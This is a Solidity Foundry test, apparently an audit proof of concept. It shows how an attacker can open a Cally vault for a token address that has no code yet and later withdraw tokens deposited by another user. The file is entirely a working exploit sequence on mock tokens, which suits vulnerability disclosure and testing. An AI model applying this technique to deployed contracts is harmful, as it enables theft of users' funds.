// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK", 18) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock ERC721 token for testing
contract MockERC721 is ERC721 {
    uint256 private _tokenIdCounter;
    
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to) external returns (uint256) {
        _tokenIdCounter++;
        _mint(to, _tokenIdCounter);
        return _tokenIdCounter;
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract ExploitTest is Test {
    Cally public cally;
    MockERC20 public tokenB;
    
    address public attacker;
    address public alice;
    
    // Address where TokenB will be deployed (simulating cross-chain deployment)
    address public constant FUTURE_TOKEN_ADDRESS = address(0x1234567890123456789012345678901234567890);
    
    function setUp() public {
        // Deploy Cally contract
        cally = new Cally();
        
        // Setup accounts
        attacker = makeAddr("attacker");
        alice = makeAddr("alice");
        
        // Fund accounts with ETH for gas
        vm.deal(attacker, 100 ether);
        vm.deal(alice, 100 ether);
    }
    
    function testExploitFutureTokenDeployment() public {
        // ============================================
        // STEP 1: Attacker sets trap before token exists
        // ============================================
        
        vm.startPrank(attacker);
        
        // Attacker creates a vault for a token that doesn't exist yet
        // The token address is known (same address across chains)
        // Since SafeTransferLib doesn't check if token has code, this succeeds
        uint256 attackerVaultId = cally.createVault(
            10000e18,                    // tokenIdOrAmount: 10000 tokens
            FUTURE_TOKEN_ADDRESS,        // token: future token address (no code yet)
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0.5 ether,                   // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );
        
        // Verify vault was created successfully despite token not existing
        Cally.Vault memory attackerVault = cally.vaults(attackerVaultId);
        assertEq(attackerVault.tokenIdOrAmount, 10000e18);
        assertEq(attackerVault.token, FUTURE_TOKEN_ADDRESS);
        assertEq(cally.ownerOf(attackerVaultId), attacker);
        
        vm.stopPrank();
        
        // ============================================
        // STEP 2: Time passes, TokenB is deployed at the same address
        // ============================================
        
        // Deploy TokenB at the predetermined address using vm.etch
        // This simulates the cross-chain deployment scenario
        MockERC20 tempToken = new MockERC20();
        bytes memory tokenCode = address(tempToken).code;
        vm.etch(FUTURE_TOKEN_ADDRESS, tokenCode);
        
        // Now we can interact with the token at FUTURE_TOKEN_ADDRESS
        tokenB = MockERC20(FUTURE_TOKEN_ADDRESS);
        
        // ============================================
        // STEP 3: Alice creates a vault with the newly deployed TokenB
        // ============================================
        
        vm.startPrank(alice);
        
        // Mint tokens to Alice
        tokenB.mint(alice, 11000e18);
        
        // Alice approves Cally to transfer her tokens
        tokenB.approve(address(cally), 11000e18);
        
        // Alice creates a vault with 11000 TokenB
        uint256 aliceVaultId = cally.createVault(
            11000e18,                    // tokenIdOrAmount: 11000 tokens
            FUTURE_TOKEN_ADDRESS,        // token: TokenB address
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0.5 ether,                   // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );
        
        // Verify Alice's tokens were transferred to Cally
        assertEq(tokenB.balanceOf(alice), 0);
        assertEq(tokenB.balanceOf(address(cally)), 11000e18);
        
        vm.stopPrank();
        
        // ============================================
        // STEP 4: Attacker withdraws, stealing Alice's tokens
        // ============================================
        
        vm.startPrank(attacker);
        
        // Attacker initiates withdrawal
        cally.initiateWithdraw(attackerVaultId);
        
        // Wait for the current option to expire (vault was just created, so currentExpiration is block.timestamp)
        vm.warp(block.timestamp + 1);
        
        // Record attacker's balance before withdrawal
        uint256 attackerBalanceBefore = tokenB.balanceOf(attacker);
        assertEq(attackerBalanceBefore, 0);
        
        // Attacker withdraws the vault
        // This will transfer 10000 TokenB from Cally to attacker
        // Even though attacker never deposited any tokens!
        cally.withdraw(attackerVaultId);
        
        // Verify attacker received 10000 TokenB
        uint256 attackerBalanceAfter = tokenB.balanceOf(attacker);
        assertEq(attackerBalanceAfter, 10000e18);
        
        // Verify Cally's balance decreased
        assertEq(tokenB.balanceOf(address(cally)), 1000e18);
        
        vm.stopPrank();
        
        // ============================================
        // VERIFICATION: Demonstrate the exploit
        // ============================================
        
        // The attacker successfully stole 10000 TokenB
        // Alice deposited 11000 TokenB, but only 1000 remains in the contract
        // The attacker created a vault for a non-existent token (no code at address)
        // When the token was deployed later, the attacker could withdraw tokens they never deposited
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Cally balance:", tokenB.balanceOf(address(cally)));
        console.log("Alice deposited: 11000e18");
        console.log("Attacker withdrew: 10000e18 (never deposited!)");
        console.log("Remaining in Cally: 1000e18");
        
        // Assert the exploit succeeded
        assertTrue(attackerBalanceAfter == 10000e18, "Attacker should have stolen 10000 tokens");
        assertTrue(tokenB.balanceOf(address(cally)) == 1000e18, "Only 1000 tokens should remain");
    }
}